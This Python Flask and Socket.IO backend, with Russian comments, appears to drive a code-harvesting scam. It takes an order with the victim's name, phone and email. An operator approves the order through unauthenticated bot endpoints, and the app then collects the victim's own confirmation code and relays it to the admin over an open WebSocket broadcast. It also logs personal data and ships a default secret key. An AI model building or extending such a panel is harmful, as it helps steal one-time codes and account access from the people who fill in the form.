from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
import uuid
import threading
import time
from datetime import datetime
import json
import logging
import os

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'your-secret-key-change-this-in-production')
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Хранилище заказов (в продакшене используйте базу данных)
orders = {}
confirmation_codes = {}
connected_clients = set()

class OrderManager:
    def __init__(self):
        pass
    
    def create_order(self, order_data):
        order_id = str(uuid.uuid4())
        order = {
            'id': order_id,
            'data': order_data,
            'status': 'pending',
            'created_at': datetime.now().isoformat(),
            'confirmation_code': None
        }
        orders[order_id] = order
        return order_id
    
    def approve_order(self, order_id):
        if order_id in orders:
            orders[order_id]['status'] = 'approved'
            
            # Уведомляем клиента через WebSocket что заказ одобрен
            socketio.emit('order_update', {
                'type': 'order_approved',
                'order_id': order_id
            })
            
            return True
        return False
    
    def reject_order(self, order_id):
        if order_id in orders:
            orders[order_id]['status'] = 'rejected'
            
            # Уведомляем клиента через WebSocket
            socketio.emit('order_update', {
                'type': 'order_rejected',
                'order_id': order_id
            })
            
            return True
        return False
    
    def verify_code(self, order_id, code):
        """
        Новая логика:
        1. Пользователь вводит свой код
        2. Сохраняем код в заказе для отправки админу
        3. Отмечаем заказ как "ожидает подтверждения кода"
        """
        if order_id in orders and orders[order_id]['status'] == 'approved':
            orders[order_id]['status'] = 'code_submitted'
            orders[order_id]['user_code'] = code
            
            # Уведомляем, что код принят
            socketio.emit('order_update', {
                'type': 'code_submitted',
                'order_id': order_id,
                'code': code
            })
            return True
        else:
            return False
    
    def confirm_code(self, order_id):
        """Подтверждение кода администратором"""
        if order_id in orders and orders[order_id]['status'] == 'code_submitted':
            orders[order_id]['status'] = 'completed'
            
            # Уведомляем клиента об успешном завершении
            socketio.emit('order_update', {
                'type': 'code_verified',
                'order_id': order_id
            })
            return True
        return False
    
    def get_order(self, order_id):
        return orders.get(order_id)
    
    def get_pending_orders(self):
        return {k: v for k, v in orders.items() if v['status'] in ['pending', 'code_submitted']}

order_manager = OrderManager()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/submit_order', methods=['POST'])
def submit_order():
    try:
        order_data = request.get_json()
        
        # Валидация данных
        required_fields = ['name', 'phone', 'email', 'service']
        for field in required_fields:
            if not order_data.get(field):
                return jsonify({'error': f'Поле {field} обязательно'}), 400
        
        # Создаем заказ
        order_id = order_manager.create_order(order_data)
        
        logger.info(f"Новый заказ создан: {order_id}")
        logger.info(f"Данные заказа: {order_data}")
        
        return jsonify({
            'success': True,
            'order_id': order_id,
            'message': 'Заказ успешно отправлен'
        })
        
    except Exception as e:
        logger.error(f"Ошибка при создании заказа: {e}")
        return jsonify({'error': 'Внутренняя ошибка сервера'}), 500

@app.route('/api/verify_code', methods=['POST'])
def verify_code():
    try:
        data = request.get_json()
        order_id = data.get('order_id')
        code = data.get('code')
        
        if not order_id or not code:
            return jsonify({'error': 'Не указан ID заказа или код'}), 400
        
        success = order_manager.verify_code(order_id, code)
        
        if success:
            logger.info(f"Код для заказа {order_id} подтвержден успешно")
            return jsonify({'success': True, 'message': 'Код подтвержден'})
        else:
            logger.warning(f"Неверный код для заказа {order_id}")
            return jsonify({'error': 'Неверный код'}), 400
            
    except Exception as e:
        logger.error(f"Ошибка при проверке кода: {e}")
        return jsonify({'error': 'Внутренняя ошибка сервера'}), 500

# API для телеграм бота
@app.route('/api/bot/orders', methods=['GET'])
def get_pending_orders():
    """Получить список ожидающих заказов для бота"""
    try:
        pending = order_manager.get_pending_orders()
        return jsonify(pending)
    except Exception as e:
        logger.error(f"Ошибка при получении заказов: {e}")
        return jsonify({'error': 'Внутренняя ошибка сервера'}), 500

@app.route('/api/bot/approve/<order_id>', methods=['POST'])
def approve_order(order_id):
    """API для подтверждения заказа ботом"""
    try:
        ok = order_manager.approve_order(order_id)
        if ok:
            logger.info(f"Заказ {order_id} подтвержден администратором")
            return jsonify({
                'success': True,
                'message': 'Заказ подтвержден'
            })
        else:
            return jsonify({'error': 'Заказ не найден'}), 404
    except Exception as e:
        logger.error(f"Ошибка при подтверждении заказа: {e}")
        return jsonify({'error': 'Внутренняя ошибка сервера'}), 500

@app.route('/api/bot/reject/<order_id>', methods=['POST'])
def reject_order(order_id):
    """API для отклонения заказа ботом"""
    try:
        success = order_manager.reject_order(order_id)
        if success:
            logger.info(f"Заказ {order_id} отклонен")
            return jsonify({'success': True, 'message': 'Заказ отклонен'})
        else:
            return jsonify({'error': 'Заказ не найден'}), 404
    except Exception as e:
        logger.error(f"Ошибка при отклонении заказа: {e}")
        return jsonify({'error': 'Внутренняя ошибка сервера'}), 500

@app.route('/api/bot/order/<order_id>', methods=['GET'])
def get_order_details(order_id):
    """Получить детали конкретного заказа"""
    try:
        order = order_manager.get_order(order_id)
        if order:
            return jsonify(order)
        else:
            return jsonify({'error': 'Заказ не найден'}), 404
    except Exception as e:
        logger.error(f"Ошибка при получении деталей заказа: {e}")
        return jsonify({'error': 'Внутренняя ошибка сервера'}), 500

@app.route('/api/bot/confirm_code/<order_id>', methods=['POST'])
def confirm_user_code(order_id):
    """API для подтверждения кода пользователя администратором"""
    try:
        ok = order_manager.confirm_code(order_id)
        if ok:
            logger.info(f"Код для заказа {order_id} подтвержден администратором")
            return jsonify({
                'success': True,
                'message': 'Код подтвержден'
            })
        else:
            return jsonify({'error': 'Заказ не найден или код не был введен'}), 404
    except Exception as e:
        logger.error(f"Ошибка при подтверждении кода: {e}")
        return jsonify({'error': 'Внутренняя ошибка сервера'}), 500

# WebSocket события
@socketio.on('connect')
def handle_connect():
    logger.info(f"Клиент подключен: {request.sid}")
    connected_clients.add(request.sid)
    emit('connected', {'message': 'Подключение установлено'})

@socketio.on('disconnect')
def handle_disconnect():
    logger.info(f"Клиент отключен: {request.sid}")
    connected_clients.discard(request.sid)

@socketio.on('join_order')
def handle_join_order(data):
    """Клиент подписывается на обновления конкретного заказа"""
    order_id = data.get('order_id')
    if order_id:
        # В реальном приложении здесь бы была логика join к комнате
        logger.info(f"Клиент {request.sid} подписался на заказ {order_id}")
        emit('joined_order', {'order_id': order_id})

# Обработка ошибок
@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Страница не найдена'}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({'error': 'Внутренняя ошибка сервера'}), 500

if __name__ == '__main__':
    logger.info("Запуск веб-сервера...")
    logger.info("Доступные API endpoints:")
    logger.info("  GET  /                     - Главная страница")
    logger.info("  POST /api/submit_order     - Отправка заказа")
    logger.info("  POST /api/verify_code      - Проверка кода подтверждения")
    logger.info("  GET  /api/bot/orders       - Получение заказов для бота")
    logger.info("  POST /api/bot/approve/<id> - Подтверждение заказа")
    logger.info("  POST /api/bot/reject/<id>  - Отклонение заказа")
    logger.info("  GET  /api/bot/order/<id>   - Детали заказа")
    
    # Запускаем сервер
    port = int(os.environ.get('PORT', 5000))
    host = os.environ.get('HOST', '0.0.0.0')
    debug = os.environ.get('DEBUG', 'False').lower() == 'true'
    
    socketio.run(app, host=host, port=port, debug=debug, allow_unsafe_werkzeug=True)
